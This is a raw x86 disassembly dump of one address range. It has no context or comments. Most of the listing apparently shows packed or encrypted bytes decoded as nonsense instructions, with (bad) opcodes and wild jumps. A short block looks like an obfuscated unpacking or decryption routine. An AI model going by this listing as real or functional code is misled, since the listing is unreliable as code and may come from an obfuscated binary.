  40c805:	mov    bl,0xcb
  40c807:	xchg   ecx,eax
  40c808:	ins    DWORD PTR es:[edi],dx
  40c809:	cmp    edi,0xffffff98
  40c80c:	outs   dx,BYTE PTR ds:[esi]
  40c80d:	cmc    
  40c80e:	inc    esi
  40c80f:	cmp    BYTE PTR [edi+0x66],al
  40c812:	retf   0x781e
  40c815:	jbe    0x40c83d
  40c817:	push   edi
  40c818:	jp     0x40c860
  40c81a:	fst    QWORD PTR [esi+edx*1-0x718112d9]
  40c821:	xor    al,BYTE PTR [edx+0x3d]
  40c824:	aaa    
  40c825:	push   ebx
  40c826:	je     0x40c81e
  40c828:	pusha  
  40c829:	mov    edx,0x24d08307
  40c82e:	fdiv   QWORD PTR [edx-0x25]
  40c831:	sbb    BYTE PTR [eax+0x52],al
  40c834:	mov    ds,esi
  40c836:	out    0xa,eax
  40c838:	push   cs
  40c839:	ret    
  40c83a:	iret   
  40c83b:	push   ebp
  40c83c:	aam    0xa9
  40c83e:	mov    ebx,0x1d2cee06
  40c843:	mov    BYTE PTR [eax+0x3e],ch
  40c846:	adc    dl,ah
  40c848:	inc    ecx
  40c849:	pop    ss
  40c84a:	fild   DWORD PTR [ecx]
  40c84c:	sbb    eax,0x6d448dfc
  40c851:	test   al,0x0
  40c853:	repz sar DWORD PTR [esi-0x77],1
  40c857:	sub    al,0xf8
  40c859:	and    ah,BYTE PTR [ebp+eax*4+0x27]
  40c85d:	pusha  
  40c85e:	xchg   ebx,eax
  40c85f:	lahf   
  40c860:	je     0x40c83a
  40c862:	mov    ch,0x73
  40c864:	call   0x881db99f
  40c869:	bound  esp,QWORD PTR [esi+ebx*2]
  40c86c:	std    
  40c86d:	mov    ebp,0xa3178f11
  40c872:	mov    WORD PTR [ebx],es
  40c874:	mov    edi,0xebbce54d
  40c879:	fst    DWORD PTR [edx-0xe8c1134]
  40c87f:	pop    esp
  40c880:	push   edx
  40c881:	cld    
  40c882:	nop
  40c883:	mov    esi,0xffadbc7d
  40c888:	dec    ebp
  40c889:	mov    ch,BYTE PTR [edx+edi*2]
  40c88c:	iret   
  40c88d:	sti    
  40c88e:	stos   DWORD PTR es:[edi],eax
  40c88f:	mov    eax,0x5f58b1ac
  40c894:	dec    edx
  40c895:	push   cs
  40c896:	dec    edi
  40c897:	jle    0x40c918
  40c899:	adc    DWORD PTR [edx],esp
  40c89b:	jecxz  0x40c89a
  40c89d:	retf   0xfb15
  40c8a0:	sub    eax,0xdce0bd6
  40c8a5:	dec    esi
  40c8a6:	adc    dh,al
  40c8a8:	mov    esp,0x2db5e43d
  40c8ad:	sub    eax,0x9034d8dd
  40c8b2:	mov    ecx,0x7a890e26
  40c8b7:	icebp  
  40c8b8:	push   ax
  40c8ba:	cld    
  40c8bb:	xchg   BYTE PTR [edx+esi*1+0x277706df],al
  40c8c2:	sub    ecx,edi
  40c8c4:	push   ds
  40c8c5:	sub    al,0x78
  40c8c7:	lods   eax,DWORD PTR ds:[esi]
  40c8c8:	mov    dh,0x48
  40c8ca:	xor    al,0x1d
  40c8cc:	fdecstp 
  40c8ce:	popf   
  40c8cf:	sub    esp,DWORD PTR [esi+0x4ddaf3cf]
  40c8d5:	pop    ecx
  40c8d6:	int3   
  40c8d7:	inc    ebp
  40c8d8:	mov    ebp,0x41d0ff5
  40c8dd:	pop    ecx
  40c8de:	sbb    cl,ch
  40c8e0:	xchg   ecx,eax
  40c8e1:	sbb    esi,esp
  40c8e3:	call   0x38b4a265
  40c8e8:	cs sub eax,0x928528f1
  40c8ee:	retf   0xe2e6
  40c8f1:	push   0xf87b65b0
  40c8f6:	xchg   edi,eax
  40c8f7:	imul   esi,DWORD PTR ds:0x4f800aca,0x9
  40c8fe:	aam    0x28
  40c900:	cmp    ecx,eax
  40c902:	cwde   
  40c903:	or     al,0x1c
  40c905:	imul   edi,edi,0x8985d904
  40c90b:	lock sbb eax,0x79cb66a0
  40c911:	int3   
  40c912:	mov    ebp,DWORD PTR [ebx]
  40c914:	test   BYTE PTR [eax+0x4d0801bb],ah
  40c91a:	mov    eax,DWORD PTR [ebp-0x20]
  40c91d:	mov    edx,DWORD PTR [ebp-0x8]
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0xcf4c5e53
  40c96a:	sbb    eax,0x9d325eab
  40c96f:	js     0x40c9e9
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	push   ds
  40c976:	push   ebx
  40c977:	(bad)  
  40c978:	jno    0x40c9c8
  40c97a:	mov    ebx,0xf475360c
  40c97f:	or     al,0xa9
  40c981:	adc    cl,BYTE PTR ds:0x3dc357f5
  40c987:	pop    ebx
  40c988:	hlt    
  40c989:	mov    eax,ds:0x9703f76b
  40c98e:	sub    BYTE PTR [edx],al
  40c990:	iret   
  40c991:	(bad)  
  40c992:	mov    WORD PTR es:[ebp-0x57],ss
  40c996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c998:	xor    BYTE PTR [edx+eiz*2+0x38],dl
  40c99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c99d:	push   ss
  40c99e:	pop    ebp
  40c99f:	out    0x3b,eax
  40c9a1:	mov    dh,0xb4
  40c9a3:	gs mov bl,0x53
  40c9a6:	fistp  QWORD PTR [eax]
  40c9a8:	test   al,0xc4
  40c9aa:	lea    edi,[edi]
  40c9ac:	call   0xc0813259
  40c9b1:	arpl   WORD PTR [eax+0x172e52b3],si
  40c9b7:	xor    al,0x6a
  40c9b9:	clc    
  40c9ba:	ret    
  40c9bb:	imul   ecx,DWORD PTR [eax+0x74],0x91fffa3
  40c9c2:	ins    BYTE PTR es:[edi],dx
  40c9c3:	push   0x1c
  40c9c5:	adc    ch,BYTE PTR [ebx+0x633adb76]
  40c9cb:	and    eax,0x535b2a52
  40c9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d1:	ins    BYTE PTR es:[edi],dx
  40c9d2:	lds    ecx,FWORD PTR [esi+ebp*8-0x23]
  40c9d6:	adc    al,0x2e
  40c9d8:	stos   DWORD PTR es:[edi],eax
  40c9d9:	mov    dl,0xc7
  40c9db:	scas   al,BYTE PTR es:[edi]
  40c9dc:	int3   
  40c9dd:	mov    fs,WORD PTR [esp-0x2b]
  40c9e1:	sub    BYTE PTR [edx],0x8b
  40c9e4:	sbb    ecx,ebx
  40c9e6:	jne    0x40c981
  40c9e8:	xchg   esi,eax
  40c9e9:	mov    dh,0x22
  40c9eb:	inc    ecx
  40c9ec:	std    
  40c9ed:	in     al,dx
  40c9ee:	xchg   esi,eax
  40c9ef:	in     eax,dx
  40c9f0:	dec    ebp
  40c9f1:	dec    eax
  40c9f2:	leave  
  40c9f3:	mov    ah,0x85
  40c9f5:	xchg   edi,eax
  40c9f6:	jmp    0x40ca31
  40c9f8:	hlt    
  40c9f9:	aad    0x6b
  40c9fb:	cmp    eax,0xf4536e8c
  40ca00:	out    dx,al
  40ca01:	dec    ecx
  40ca02:	mov    al,0xdb
  40ca04:	mov    bh,BYTE PTR [esi+ecx*1-0x77]
  40ca08:	xor    ebx,esi
  40ca0a:	pushf  
  40ca0b:	data16 loopne 0x40c9a5
  40ca0e:	mov    esp,0x8a8565be
  40ca13:	mov    al,ds:0xe3828b7
  40ca18:	sub    BYTE PTR [ebx+0x3a],0xa3
  40ca1c:	jp     0x40c9f8
  40ca1e:	ins    DWORD PTR es:[edi],dx
  40ca1f:	call   DWORD PTR [edx-0x47]
  40ca22:	adc    eax,0x300eaff
  40ca27:	aam    0xa7
  40ca29:	mov    ebx,DWORD PTR [eax+0x3b]
  40ca2c:	test   BYTE PTR [esi],dh
  40ca2e:	ret    
  40ca2f:	sub    BYTE PTR [eax+0x56],ch
  40ca32:	into   
  40ca33:	lods   eax,DWORD PTR ds:[esi]
  40ca34:	std    
  40ca35:	popa   
  40ca36:	out    dx,al
  40ca37:	(bad)  
  40ca38:	(bad)  
  40ca39:	std    
  40ca3a:	ret    0xe107
  40ca3d:	push   ebx
  40ca3e:	mov    ch,0x33
  40ca40:	imul   esp,DWORD PTR [ebp+0x17b8e2d5],0x54789e6
  40ca4a:	inc    edx
  40ca4b:	popa   
  40ca4c:	cmp    bh,BYTE PTR [esi]
  40ca4e:	repnz sbb ch,BYTE PTR [edi+0x6bca8c45]
  40ca55:	inc    esp
  40ca56:	mov    ecx,0x965ad170
  40ca5b:	call   esi
  40ca5d:	test   eax,0x6a1248e3
  40ca62:	lods   eax,DWORD PTR ds:[esi]
  40ca63:	js     0x40ca7a
  40ca65:	sti    
  40ca66:	mov    BYTE PTR ds:0xf871a838,bl
  40ca6c:	sub    ecx,DWORD PTR [edx+0x218b1396]
  40ca72:	js     0x40ca0a
  40ca74:	dec    ecx
  40ca75:	add    bl,BYTE PTR [eax-0x29]
  40ca78:	(bad)  
  40ca79:	clc    
  40ca7a:	mov    ch,0x7d
  40ca7c:	loope  0x40cab7
  40ca7e:	adc    eax,0x827f7cfb
  40ca83:	retf   0x6fd7
  40ca86:	ja     0x40ca7b
  40ca88:	sub    cl,BYTE PTR [ebx]
  40ca8a:	xchg   esp,eax
  40ca8b:	mov    ebp,0x66330d8
  40ca90:	retf   0x76c9
  40ca93:	xlat   BYTE PTR ds:[ebx]
  40ca94:	xchg   ebp,eax
  40ca95:	loopne 0x40ca4d
  40ca97:	test   BYTE PTR ds:0x67b8b62a,dl
  40ca9d:	int3   
  40ca9e:	pusha  
  40ca9f:	repz (bad) 
  40caa1:	fimul  DWORD PTR [eax+0x2f]
  40caa4:	and    BYTE PTR [ecx],ah
  40caa6:	test   DWORD PTR [edi+0x37764237],0x5856b643
  40cab0:	loope  0x40cb0c
  40cab2:	mov    ecx,0x9c549485
  40cab7:	push   ss
  40cab8:	js     0x40caef
  40caba:	cmp    eax,0xe314e158
  40cabf:	aaa    
  40cac0:	test   eax,0x7a05a78a
  40cac5:	shl    DWORD PTR [ebx+eiz*4],0x60
  40cac9:	or     al,0x4d
  40cacb:	sar    BYTE PTR ss:[edi-0xa],1
  40cacf:	inc    esi
  40cad0:	ins    DWORD PTR es:[edi],dx
  40cad1:	fwait
  40cad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad3:	dec    esi
  40cad4:	push   cs
  40cad5:	adc    edx,DWORD PTR [edx+0x4c73649c]
  40cadb:	fs or  edi,0xffffffad
  40cadf:	inc    ebx
  40cae0:	pop    edi
  40cae1:	hlt    
  40cae2:	loopne 0x40cad6
  40cae4:	mov    ds:0xd56242f1,al
  40cae9:	adc    eax,0x77d8b54d
  40caee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40caef:	fcom   QWORD PTR [esi+0x4c]
  40caf2:	scas   eax,DWORD PTR es:[edi]
  40caf3:	(bad)  
  40caf4:	push   ebp
  40caf5:	push   0xffffff8d
  40caf7:	xor    al,0xf1
  40caf9:	mov    dh,0x1d
  40cafb:	popf   
  40cafc:	out    0x9e,eax
  40cafe:	sub    BYTE PTR [ecx-0x44553397],0x42
  40cb05:	jno    0x40cb50
  40cb07:	in     eax,dx
  40cb08:	mov    WORD PTR [ecx],ss
  40cb0a:	dec    ebx
  40cb0b:	bound  esp,QWORD PTR [eax]
  40cb0d:	mov    ebx,0xd0e23b0c
  40cb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb13:	int3   
  40cb14:	xchg   edi,eax
  40cb15:	in     eax,0xf4
  40cb17:	mov    eax,0x257e102
  40cb1c:	mov    edi,0xcc7d4d1f
  40cb21:	or     BYTE PTR [ebp+0x48],dl
  40cb24:	add    dl,dl
  40cb26:	fs pop ds
  40cb28:	jmp    0x87d7b6a3
  40cb2d:	test   BYTE PTR [esi],ch
  40cb2f:	(bad)  
  40cb30:	ds fdivrp st(6),st
  40cb33:	fs jp  0x40cb17
  40cb36:	(bad)
  40cb39:	jge    0x40caf6
  40cb3b:	les    ecx,FWORD PTR [eax]
  40cb3d:	xchg   edi,eax
  40cb3e:	adc    al,0xcd
  40cb40:	mov    esi,0x43f9ddf
  40cb45:	aaa    
  40cb46:	retf   
  40cb47:	xchg   esi,eax
  40cb48:	out    0xc1,al
  40cb4a:	mov    ch,0x81
  40cb4c:	dec    esp
  40cb4d:	js     0x40cb3d
  40cb4f:	cdq    
  40cb50:	mov    ?,WORD PTR [eax+eiz*8]
  40cb53:	dec    edi
  40cb54:	mov    al,0xb2
  40cb56:	cld    
  40cb57:	xor    al,0x7
  40cb59:	ins    BYTE PTR es:[edi],dx
  40cb5a:	mov    eax,0x6e9d7cf0
  40cb5f:	sbb    al,0x5a
  40cb61:	sbb    ah,bl
  40cb63:	or     BYTE PTR fs:[ebx+0x4f62df32],dh
  40cb6a:	lock xchg DWORD PTR [eax-0x3e2c5d8],edi
  40cb71:	cmp    ebp,edx
  40cb73:	idiv   DWORD PTR [edx]
  40cb75:	xchg   ebx,eax
  40cb76:	pushf  
  40cb77:	xor    DWORD PTR [eax-0x4f3d87d],ecx
  40cb7d:	mov    ah,al
  40cb7f:	stos   DWORD PTR es:[edi],eax
  40cb80:	repnz add eax,DWORD PTR [ebx-0x30]
  40cb84:	jnp    0x40cb49
  40cb86:	cdq    
  40cb87:	fcom   st(5)
  40cb89:	arpl   WORD PTR [ebx+0x7a],dx
  40cb8c:	jno    0x40cb29
  40cb8e:	jle    0x40cb29
  40cb90:	(bad)  
  40cb91:	in     eax,0xee
  40cb93:	xor    cl,ch
  40cb95:	add    DWORD PTR [edi+0x217f9d5a],ebx
  40cb9b:	adc    BYTE PTR [edi+0x3e398baf],0x21
  40cba2:	jmp    0x22ee937b
  40cba7:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40cba9:	adc    esp,eax
  40cbab:	das    
  40cbac:	mov    ebx,0x244e170f
  40cbb1:	mov    ds:0x2ebd82b2,eax
  40cbb6:	xchg   ecx,eax
  40cbb7:	cs cmp al,0x5f
  40cbba:	lods   al,BYTE PTR ds:[esi]
  40cbbb:	and    ch,BYTE PTR ds:0xfbd597b8
  40cbc1:	pushf  
  40cbc2:	lods   eax,DWORD PTR ds:[esi]
  40cbc3:	jg     0x40cb63
  40cbc5:	push   esp
  40cbc6:	test   BYTE PTR [eax-0x66],ch
  40cbc9:	(bad)  
  40cbcb:	xchg   BYTE PTR [edx],dl
  40cbcd:	sbb    ebp,DWORD PTR [ebp+0x14]
  40cbd0:	adc    dh,BYTE PTR ds:0xd372756b
  40cbd6:	out    0x21,eax
  40cbd8:	or     eax,0xcfaf50cf
  40cbdd:	mov    bl,0xc9
  40cbdf:	adc    bl,BYTE PTR [ecx]
  40cbe1:	enter  0x5f53,0x6d
  40cbe5:	repz pushf 
  40cbe7:	adc    ecx,edx
  40cbe9:	sub    edx,DWORD PTR ds:0x4cdafb35
  40cbef:	cmp    al,BYTE PTR [ebx]
  40cbf1:	sbb    ah,BYTE PTR [eax+0x7783868a]
  40cbf7:	jnp    0x40cbc9
  40cbf9:	cwde   
  40cbfa:	and    al,0x91
  40cbfc:	enter  0xfc18,0x61
  40cc00:	in     al,dx
  40cc01:	repnz (bad) 
  40cc03:	jmp    0x54553bb
  40cc08:	and    dh,BYTE PTR [edx-0x1e02a44a]
  40cc0e:	or     DWORD PTR [ebp-0x5f86c300],esp
  40cc14:	daa    
  40cc15:	ret    
  40cc16:	das    
  40cc17:	xchg   ebx,eax
  40cc18:	jmp    FWORD PTR [edi+ecx*2]
  40cc1b:	push   0x2d0f0635
  40cc20:	pop    es
  40cc21:	enter  0x97e5,0xd6
  40cc25:	in     eax,dx
  40cc26:	inc    edx
  40cc27:	dec    ebx
  40cc28:	xor    BYTE PTR [ebp+0x39],bl
  40cc2b:	rcl    BYTE PTR [esi+0x62e7ebcd],0x50
  40cc32:	loop   0x40cc75
  40cc34:	push   0xd78db2e9
  40cc39:	push   0x7bfb64c1
  40cc3e:	push   esi
  40cc3f:	xlat   BYTE PTR ds:[ebx]
  40cc40:	in     al,dx
  40cc41:	hlt    
  40cc42:	mov    ah,0x58
  40cc44:	pop    ecx
  40cc45:	mov    WORD PTR [esi-0xc435187],?
  40cc4b:	lea    esp,[ebx-0x2f]
  40cc4e:	loopne 0x40cca7
  40cc50:	std    
  40cc51:	(bad)  
  40cc52:	iret   
  40cc53:	leave  
  40cc54:	and    edx,DWORD PTR [ecx]
  40cc56:	lock fist DWORD PTR [edx]
  40cc59:	add    dl,BYTE PTR [edx-0x3414d8d0]
  40cc5f:	movd   esp,mm7
  40cc62:	dec    eax
  40cc63:	jecxz  0x40cc9a
  40cc65:	push   edi
  40cc66:	dec    edx
  40cc67:	lods   eax,DWORD PTR ds:[esi]
  40cc68:	push   edi
  40cc69:	or     eax,0x406926a9
  40cc6e:	ret    
  40cc6f:	cld    
  40cc70:	adc    eax,0x14e93839
  40cc75:	add    eax,DWORD PTR [eax]
  40cc77:	add    dh,al
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0xf2
  40cc85:	jg     0x40cc60
  40cc87:	mov    WORD PTR [esi],gs
  40cc89:	mov    ds:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	js     0x40ccd5
  40cc92:	and    al,0x51
  40cc94:	call   FWORD PTR [ebp+0x43]
  40cc97:	push   ecx
  40cc98:	and    al,BYTE PTR [eax+0x63]
  40cc9b:	adc    dl,BYTE PTR [ebx]
  40cc9d:	ret    0xb945
  40cca0:	popa   
  40cca1:	mov    ah,0xff
  40cca3:	cmp    eax,0x3db74fdd
  40cca8:	mov    ah,0xc8
  40ccaa:	inc    eax
  40ccab:	jae    0x40cd0b
  40ccad:	sub    BYTE PTR [ecx],dh
  40ccaf:	add    eax,0x3b62deaf
  40ccb4:	and    eax,0x2eed77c3
  40ccb9:	aad    0xe5
  40ccbb:	sahf   
  40ccbc:	adc    esp,edi
  40ccbe:	inc    ebp
  40ccbf:	js     0x40cd26
  40ccc1:	jns    0x40cc7b
  40ccc3:	neg    bl
  40ccc5:	cmc    
  40ccc6:	aad    0x79
  40ccc8:	dec    edx
  40ccc9:	mov    al,ds:0xddd60f11
  40ccce:	dec    ecx
  40cccf:	sar    BYTE PTR ds:0xf58806c8,cl
  40ccd5:	mov    ch,0x61
  40ccd7:	repz fwait
  40ccd9:	in     eax,0x4f
  40ccdb:	in     al,0xe3
  40ccdd:	push   cs
  40ccde:	dec    edi
  40ccdf:	add    dh,0x10
  40cce2:	xchg   edi,eax
  40cce3:	sbb    al,bh
  40cce5:	ins    DWORD PTR es:[edi],dx
  40cce6:	pusha  
  40cce7:	and    al,0x59
  40cce9:	mov    al,BYTE PTR [edx+0x1c]
  40ccec:	adc    DWORD PTR [ebx],edi
  40ccee:	pop    ebx
  40ccef:	int    0x4c
  40ccf1:	iret   
  40ccf2:	sub    cl,BYTE PTR [edi-0x7055e298]
  40ccf8:	sbb    esp,DWORD PTR [edi]
  40ccfa:	loopne 0x40cd4d
  40ccfc:	sub    BYTE PTR [esi],dl
  40ccfe:	xchg   ebx,eax
  40ccff:	mov    ds:0xf1a312f2,eax
  40cd04:	dec    eax
  40cd05:	rol    DWORD PTR [ebp-0x61],cl
  40cd08:	std    
  40cd09:	or     esi,esp
  40cd0b:	and    eax,0x8686e79d
  40cd10:	jb     0x40cd29
  40cd12:	sar    BYTE PTR [esp+ecx*8+0xca41985],1
  40cd19:	nop
  40cd1a:	mov    al,0xd5
  40cd1c:	push   0x30
  40cd1e:	mov    bl,0xc
  40cd20:	iret   
  40cd21:	sub    DWORD PTR [esi],0xaf01cbba
  40cd27:	inc    edi
  40cd28:	and    DWORD PTR [edx+0x50],esi
  40cd2b:	xchg   esp,eax
  40cd2c:	stos   BYTE PTR es:[edi],al
  40cd2d:	pop    ds
  40cd2e:	je     0x40cd20
  40cd30:	nop
  40cd31:	xor    DWORD PTR [ecx-0x5d704058],eax
  40cd37:	imul   BYTE PTR [esi+0x54]
  40cd3a:	sub    dl,BYTE PTR [ebp-0x6e]
  40cd3d:	ror    BYTE PTR [ecx+0x58],1
  40cd40:	loopne 0x40cd9f
  40cd42:	ficomp DWORD PTR [ecx+0x5be483f6]
  40cd48:	push   ds
  40cd49:	int3   
  40cd4a:	lock cmc 
  40cd4c:	dec    eax
  40cd4d:	adc    DWORD PTR [edi],ebx
  40cd4f:	or     dh,BYTE PTR [ecx+0x502b7b00]
  40cd55:	(bad)  
  40cd56:	xor    ebx,DWORD PTR [eax-0x13]
  40cd59:	or     DWORD PTR [ecx+esi*8],ecx
  40cd5c:	sub    DWORD PTR [edx-0x56628d5b],ebp
  40cd62:	mov    ds:0xfb1ddcbd,eax
  40cd67:	or     edx,ecx
  40cd69:	sbb    DWORD PTR [ebx+0x20465d05],ebx
  40cd6f:	cmp    eax,0x77962f45
  40cd74:	mov    esp,0xe814b7ea
  40cd79:	pop    eax
  40cd7a:	(bad)  
  40cd7b:	ja     0x40cdb6
  40cd7d:	das    
  40cd7e:	push   ss
  40cd7f:	mov    ecx,0xf2379bfc
  40cd84:	fild   DWORD PTR [ebx+0x1940bda5]
  40cd8a:	add    eax,DWORD PTR [edi]
  40cd8c:	push   cs
  40cd8d:	sar    DWORD PTR ds:0xf9ba5533,1
  40cd93:	scas   eax,DWORD PTR es:[edi]
  40cd94:	add    al,0x7f
  40cd96:	imul   edi,DWORD PTR [edx-0x3b],0x5e228be0
  40cd9d:	mov    esi,DWORD PTR [esi-0x54]
  40cda0:	mov    al,0x80
  40cda2:	daa    
  40cda3:	or     dl,0x90
  40cda6:	les    edi,FWORD PTR [ecx]
  40cda8:	outs   dx,DWORD PTR ds:[esi]
  40cda9:	mov    eax,ds:0x444f392c
  40cdae:	jae    0x40ce0a
  40cdb0:	aaa    
  40cdb1:	sub    DWORD PTR [eax],ebx
  40cdb3:	(bad)  
  40cdb4:	sbb    DWORD PTR [ecx-0x3c],ebp
  40cdb7:	dec    eax
  40cdb8:	test   eax,0xc7d342e3
  40cdbd:	out    dx,eax
  40cdbe:	iret   
  40cdbf:	xor    BYTE PTR [ebx-0x1d],0x9f
  40cdc3:	adc    esi,DWORD PTR [ecx+0x4de4587]
  40cdc9:	sbb    DWORD PTR [esi],ebp
  40cdcb:	fucom  st(5)
  40cdcd:	cmp    ch,BYTE PTR [eax+0x37]
  40cdd0:	add    BYTE PTR [esi+ebx*2-0x46],ah
  40cdd4:	scas   al,BYTE PTR es:[edi]
  40cdd5:	cdq    
  40cdd6:	and    DWORD PTR [esi+0x65],esp
  40cdd9:	in     eax,dx
  40cdda:	into   
  40cddb:	(bad)  
  40cddc:	(bad)  
  40cdde:	aas    
  40cddf:	mov    edx,0xa5d3a39d
  40cde4:	(bad)
  40cde8:	ror    bl,cl
  40cdea:	sub    esi,esp
  40cdec:	ins    BYTE PTR es:[edi],dx
  40cded:	dec    edx
  40cdee:	sbb    edx,ebx
  40cdf0:	pop    esi
  40cdf1:	stos   DWORD PTR es:[edi],eax
  40cdf2:	(bad)  
  40cdf3:	xor    edi,DWORD PTR [esi]
  40cdf5:	je     0x40ce4a
  40cdf7:	or     BYTE PTR [esp+ecx*1+0x31818ada],ah
  40cdfe:	mov    bl,0x5f
  40ce00:	jmp    0x7bb83800
  40ce05:	ret    
  40ce06:	pop    ds
  40ce07:	nop
  40ce08:	mov    ecx,0x689307f9
  40ce0d:	neg    DWORD PTR [edi+edx*4-0x5b29e6e9]
  40ce14:	aaa    
  40ce15:	fs repz cmp al,0xa8
  40ce19:	leave  
  40ce1a:	push   es
  40ce1b:	dec    esi
  40ce1c:	(bad)  
  40ce1d:	(bad)  
  40ce1e:	shl    DWORD PTR [edi],cl
  40ce20:	leave  
  40ce21:	mov    WORD PTR [ecx-0x7f8bc85b],ss
  40ce27:	jmp    0x63ffa9e4
  40ce2c:	out    dx,eax
  40ce2d:	sahf   
  40ce2e:	inc    ebp
  40ce2f:	cld    
  40ce30:	adc    DWORD PTR [esi],ecx
  40ce32:	and    eax,0xfb09ef18
  40ce37:	(bad)  
  40ce38:	xchg   edx,eax
  40ce39:	mov    ds:0xa648086b,eax
  40ce3e:	test   bh,dl
  40ce40:	stos   BYTE PTR es:[edi],al
  40ce41:	(bad)  
  40ce42:	mov    ds:0x639dd533,eax
  40ce47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce48:	adc    eax,0x18a74c3f
  40ce4d:	sub    eax,0x80238d5e
  40ce52:	and    DWORD PTR [eax],esp
  40ce54:	fdivr  DWORD PTR [esi-0x1c318c34]
  40ce5a:	imul   esp,DWORD PTR [edx+0x1e804627],0xffffffa4
  40ce61:	and    edi,0x5cc570d7
  40ce67:	(bad)  
  40ce68:	js     0x40ce9b
  40ce6a:	stc    
  40ce6b:	test   eax,0x17843395
  40ce70:	pop    es
  40ce71:	push   esi
  40ce72:	(bad)  
  40ce73:	push   ecx
  40ce74:	imul   esp,DWORD PTR ds:0x2746e622,0x1b43f4dd
  40ce7e:	call   0x8647:0x73ac9110
  40ce85:	neg    ebp
  40ce87:	mov    ah,0x6f
  40ce89:	mov    ch,0xf6
  40ce8b:	test   eax,0x373c09ec
  40ce90:	xchg   ebx,eax
  40ce91:	cmp    ebx,DWORD PTR [ebp-0x5d1605d5]
  40ce97:	mov    ebx,0xc64645c6
  40ce9c:	jbe    0x40cef9
  40ce9e:	pop    eax
  40ce9f:	add    al,0xaf
  40cea1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cea2:	jg     0x40cee9
  40cea4:	adc    BYTE PTR [edx],bh
  40cea6:	test   al,0xe4
  40cea8:	repnz cs push 0x5cd3efea
  40ceaf:	mov    DWORD PTR [ebx-0x645b59cf],ecx
  40ceb5:	xlat   BYTE PTR ds:[ebx]
  40ceb6:	sbb    eax,0xeb34c6b7
  40cebb:	sub    DWORD PTR [edi],eax
  40cebd:	popf   
  40cebe:	adc    eax,DWORD PTR [esi]
  40cec0:	mov    ecx,0xa82bc5ec
  40cec5:	ror    DWORD PTR [ecx],1
  40cec7:	jp     0x40ce89
  40cec9:	cwde   
  40ceca:	call   0xdfe67758
  40cecf:	adc    eax,0x873c95cb
  40ced4:	or     eax,0x4003934c
  40ced9:	sub    eax,0xc18c8168
  40cede:	sbb    edx,DWORD PTR ds:0x5707397f
  40cee4:	stc    
  40cee5:	add    BYTE PTR [ebx-0x62],ch
  40cee8:	jp     0x40ceec
  40ceea:	out    0xa4,eax
  40ceec:	pop    edx
  40ceed:	cmp    BYTE PTR [eax-0x75],0xb9
  40cef1:	inc    ebp
  40cef2:	cdq    
  40cef3:	hlt    
  40cef4:	sbb    al,0x92
  40cef6:	pop    ds
  40cef7:	jp     0x40cf4a
  40cef9:	jbe    0x40cf6f
  40cefb:	pop    ds
  40cefc:	nop
  40cefd:	cmp    eax,0x98da6a5b
  40cf02:	cmp    DWORD PTR [ebx],ebp
  40cf04:	sub    eax,0x66c4efc5
  40cf09:	mov    dl,0x35
  40cf0b:	inc    eax
  40cf0c:	int3   
  40cf0d:	xchg   edx,eax
  40cf0e:	(bad)  
  40cf0f:	jle    0x40cf2b
  40cf11:	retf   
  40cf12:	fs jmp 0x9e58:0x2766387
  40cf1a:	enter  0x6d89,0xf4
  40cf1e:	dec    esp
  40cf1f:	cmp    ch,0x31
  40cf22:	sahf   
  40cf23:	jns    0x40cf92
  40cf25:	int    0xe6
  40cf27:	rcr    BYTE PTR [ecx+0x15f8d8a1],0xee
  40cf2e:	(bad)  
  40cf2f:	cmc    
  40cf30:	xchg   ebx,eax
  40cf31:	shl    BYTE PTR [ecx+0xff42b88],1
  40cf37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf38:	fdiv   st,st(5)
  40cf3a:	pop    ebx
  40cf3b:	sbb    eax,0xca0e22e5
  40cf40:	mov    al,ds:0x5d5d482d
  40cf45:	mov    BYTE PTR [eax+0x6a6b3033],dl
  40cf4b:	stc    
  40cf4c:	cmp    al,dh
  40cf4e:	es sub al,0xcb
  40cf51:	out    dx,eax
  40cf52:	sbb    al,0xac
  40cf54:	imul   edx,edi,0x62
  40cf57:	dec    ebp
  40cf58:	sahf   
  40cf59:	fild   WORD PTR [ebp+0x27]
  40cf5c:	inc    ebx
  40cf5d:	lods   al,BYTE PTR ds:[esi]
  40cf5e:	push   edx
  40cf5f:	out    0x1,eax
  40cf61:	stc    
  40cf62:	add    eax,0xc7ec07bc
  40cf67:	stos   DWORD PTR es:[edi],eax
  40cf68:	xor    dh,BYTE PTR [ebx-0x71]
  40cf6b:	sub    DWORD PTR [edi-0x2a],0xffffffcd
  40cf6f:	test   DWORD PTR [ebp-0x21],esp
  40cf72:	adc    DWORD PTR [edx],edx
  40cf74:	mov    esi,0x5da993f2
  40cf79:	mov    edi,0x85388df3
  40cf7e:	ins    DWORD PTR es:[edi],dx
  40cf7f:	rol    DWORD PTR [ebp-0x5a],cl
